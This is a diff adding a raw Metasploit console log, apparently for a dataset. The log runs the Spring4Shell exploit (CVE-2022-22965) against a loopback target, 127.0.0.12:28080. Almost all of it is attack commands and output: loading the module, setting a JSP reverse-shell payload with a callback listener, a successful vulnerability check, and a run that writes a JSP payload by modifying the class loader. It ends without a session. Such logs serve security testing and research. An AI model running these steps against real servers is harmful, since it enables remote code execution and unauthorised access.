@@ -1,0 +1,47 @@
+[*] Spooling to file /home/kali/dataset/raw/metasploit/2026-08-04/spring_22965/scan.txt...
+resource (/tmp/spring.rc)> search cve:2022-22965
+
+Matching Modules
+================
+
+   #  Full Name                                             Disclosure Date  Rank    Check  Name
+   -  ---------                                             ---------------  ----    -----  ----
+   0  exploit/multi/http/spring_framework_rce_spring4shell  2022-03-31       manual  Yes    Spring Framework Class property RCE (Spring4Shell)
+   1    \_ target: Java                                     .                .       .      .
+   2    \_ target: Linux                                    .                .       .      .
+   3    \_ target: Windows                                  .                .       .      .
+   4    \_ AKA: Spring4Shell                                .                .       .      .
+   5    \_ AKA: SpringShell                                 .                .       .      .
+
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/multi/http/spring_framework_rce_spring4shell
+
+resource (/tmp/spring.rc)> use exploit/multi/http/spring_framework_rce_spring4shell
+[*] No payload configured, defaulting to generic/shell_reverse_tcp
+resource (/tmp/spring.rc)> set RHOSTS 127.0.0.12
+RHOSTS => 127.0.0.12
+resource (/tmp/spring.rc)> set RPORT 28080
+RPORT => 28080
+resource (/tmp/spring.rc)> set TARGETURI /
+TARGETURI => /
+resource (/tmp/spring.rc)> set PAYLOAD java/jsp_shell_reverse_tcp
+PAYLOAD => java/jsp_shell_reverse_tcp
+resource (/tmp/spring.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (/tmp/spring.rc)> set LPORT 4545
+LPORT => 4545
+resource (/tmp/spring.rc)> check
+[+] 127.0.0.12:28080 - The target appears to be vulnerable.
+resource (/tmp/spring.rc)> run
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4545 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[+] Automatically identified HTTP method: GET
+[*] 127.0.0.12:28080 - Generating JSP...
+[*] 127.0.0.12:28080 - Modifying Class Loader...
+[*] 127.0.0.12:28080 - Waiting for the server to flush the logfile
+[*] 127.0.0.12:28080 - Executing JSP payload at http://127.0.0.12:28080/dCVrj6782.jsp
+[+] 127.0.0.12:28080 - Log file flushed
+[*] Exploit completed, but no session was created.
+resource (/tmp/spring.rc)> spool off
